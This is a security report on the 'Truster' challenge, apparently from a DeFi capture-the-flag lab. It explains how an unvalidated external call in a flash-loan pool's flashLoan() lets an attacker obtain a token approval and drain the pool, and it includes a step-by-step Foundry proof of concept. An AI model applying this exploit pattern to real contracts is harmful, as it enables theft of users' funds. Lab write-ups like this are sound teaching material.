# Security Report: Truster

---

## 1. Vulnerability Summary

The `TrusterLenderPool` contains an unrestricted external call inside its `flashLoan()` function.

The function accepts user-controlled `target` and `data` parameters and executes them through `target.functionCall(data)` without validating the target or restricting the function being called.

An attacker can exploit this functionality by supplying the token contract as the target and encoding an `approve()` call.

By requesting a zero-amount flash loan, the attacker can make the pool approve an attacker-controlled address to spend its entire token balance.

The approved address can subsequently use `transferFrom()` to drain all tokens from the pool.

## 2. Affected Code

**Contract:** `TrusterLenderPool.sol`  
**Function:** `flashLoan()`

### Vulnerable Implementation

```solidity
function flashLoan(
    uint256 amount,
    address borrower,
    address target,
    bytes calldata data
)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);

    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

### Root Cause

```solidity
target.functionCall(data);
```

The pool executes arbitrary external calls using attacker-controlled parameters.

There is no validation restricting which contracts or functions can be called.

Consequently, an attacker can invoke privileged token operations in the context of the pool's own token holdings.

## 3. Exploitation Mechanism

The attack requires two stages.

**Stage 1 – Obtain Token Approval**

The attacker constructs an encoded approval call:

```solidity
bytes memory packedCall = abi.encodeCall(
    token.approve,
    (address(recovery), 1000000e18)
);
```

The attacker then initiates a zero-amount flash loan:

```solidity
pool.flashLoan(
    0,
    address(player),
    address(token),
    packedCall
);
```

The pool executes `approve()` on the token contract.

Since the call originates from the pool's address, the token contract records the pool as the owner of the allowance.

Consequently, the recovery address receives an allowance of `1,000,000 DVT`.

**Stage 2 – Drain the Pool**

The approved address executes:

```solidity
token.transferFrom(
    address(pool),
    address(recovery),
    TOKENS_IN_POOL
);
```

The transfer succeeds because the pool previously authorized the recovery address to spend its tokens.

The entire token balance is extracted without borrowing any tokens.

## 4. Proof of Concept (Foundry)

### Step 1 – Verify Initial Pool Balance

```solidity
assertEq(
    token.balanceOf(address(pool)),
    1000000e18
);
```

### Step 2 – Encode Arbitrary Approval

```solidity
bytes memory packedCall = abi.encodeCall(
    token.approve,
    (address(recovery), 1000000e18)
);
```

### Step 3 – Execute Zero-Amount Flash Loan

```solidity
vm.startPrank(player);

pool.flashLoan(
    0,
    address(player),
    address(token),
    packedCall
);

vm.stopPrank();
```

The arbitrary external call grants the recovery address permission to spend the pool's entire token balance.

### Step 4 – Extract Pool Funds

```solidity
vm.startPrank(recovery);

token.transferFrom(
    address(pool),
    address(recovery),
    TOKENS_IN_POOL
);

vm.stopPrank();
```

### Step 5 – Verify Successful Exploitation

```solidity
assertEq(
    token.balanceOf(address(pool)),
    0e18
);
```

The final assertion confirms that the pool has been completely drained.

## 5. Security Impact

- **Unauthorized Approval:** An attacker can make the pool approve arbitrary token spending.
- **Complete Fund Drain:** The pool's entire token balance can be extracted.
- **No Borrowing Required:** The exploit works with a zero-amount flash loan.
- **Permissionless Exploitation:** No privileged access or ownership permissions are required.

## 6. Conclusion

The vulnerability originates from allowing arbitrary external calls through user-controlled flash loan parameters.

By targeting the token contract and executing an approval operation, an attacker can obtain spending authorization over the pool's entire token balance.

The zero-amount flash loan bypasses the need to borrow actual tokens while still allowing the malicious external call to execute.

**Result:** The Foundry PoC successfully demonstrates a permissionless, zero-borrowing attack that drains the entire 1,000,000 DVT held by the pool.
